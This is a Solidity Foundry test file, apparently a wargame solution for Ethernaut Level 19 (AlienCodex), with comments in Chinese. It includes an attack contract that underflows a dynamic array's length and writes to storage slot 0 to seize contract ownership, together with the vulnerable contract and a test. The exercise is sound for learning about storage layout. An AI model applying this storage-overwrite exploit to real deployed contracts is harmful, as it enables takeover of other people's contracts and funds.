// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract AlienCodexHack {
    constructor(address _alienCodex) public {
        AlienCodex codex = AlienCodex(_alienCodex);
        codex.makeContact();
        // 让codex的length变成最大值，确保后续访问任意一个下标都不会越界
        codex.retract();

        // 通过观察storage，我们能猜到ownable占了storage[0x00]
        // 我们看到的 `bool public contact` 也在 storage[0x00]，在owner左侧
        // 所以数组 `bytes32[] public codex` 的storage位置是 `0x01`
        // 所以 codex[0] 的storage位置是 `uint256(keccak256(abi.encodePacked(uint256(1))))`
        uint256 storageIndexOfArray0 = uint256(keccak256(abi.encodePacked(uint256(1))));
        console.log("array0: ", storageIndexOfArray0);

        // 0.5.*版本使用这个语法： relativeIndexOfStorage0x00 = -storageIndexOfArray0;
        uint256 relativeIndexOfStorage0x00 = type(uint256).max - storageIndexOfArray0 + 1;
        console.log("relativeIndexOfStorage0x00: ", relativeIndexOfStorage0x00);
        // 当前的array，往后移动 storageIndexOfArray0 个位置, 正好就回到了 storage[0x00] 的位置
        // 所以这里我们把 storage[0x00] 设置为 this 的地址
        codex.revise(relativeIndexOfStorage0x00, bytes32(uint256(uint160(msg.sender))));
    }
}

/**
 * @title AlienCodex
 * @notice 合并了 Ownable-05.sol + AlienCodex.sol，用于 Ethernaut Level 19 演示
 */
contract AlienCodex {
    // === Ownable 部分 ===
    address public owner; // slot 0 (前 20 bytes)
    // === AlienCodex 部分 ===
    bool public contact; // 紧跟在 slot0 低位，bool 1 byte
    bytes32[] public codex; // slot 1（动态数组）

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    modifier contacted() {
        assert(contact);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is zero");
        owner = newOwner;
    }
    // === AlienCodex 逻辑 ===

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        assembly {
            sstore(codex.slot, sub(sload(codex.slot), 1))
        }
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        assembly {
            mstore(0x0, codex.slot)
            let base := keccak256(0x0, 0x20)
            let slot := add(base, i)
            sstore(slot, _content)
        }
    }
}

// forge test --match-contract Level19Test
contract Level19Test is Test {
    AlienCodex c1;
    AlienCodexHack hack;
    address a = address(0x12);
    address b = address(0x13);
    address c = address(0x14);

    function setUp() public {
        vm.deal(a, 0.1 ether);
        vm.deal(b, 0.2 ether);
        vm.deal(c, 0.3 ether);

        vm.startPrank(a, a);
        c1 = new AlienCodex();
        vm.store(address(c1), 0x00, bytes32(uint256(uint160(bytes20(hex"9a65d28f9e195fcbf9599ba0f0552dc6129dfb2c")))));
        vm.stopPrank();
    }

    function testHack() public {
        vm.startPrank(b, b);
        console.log("old value: ", c1.owner());
        hack = new AlienCodexHack(address(c1));
        // 应该等于 0x9a65d28f9e195fcbf9599ba0f0552dc6129dfb2c
        console.log("new value: ", c1.owner());
        vm.stopPrank();
    }
}
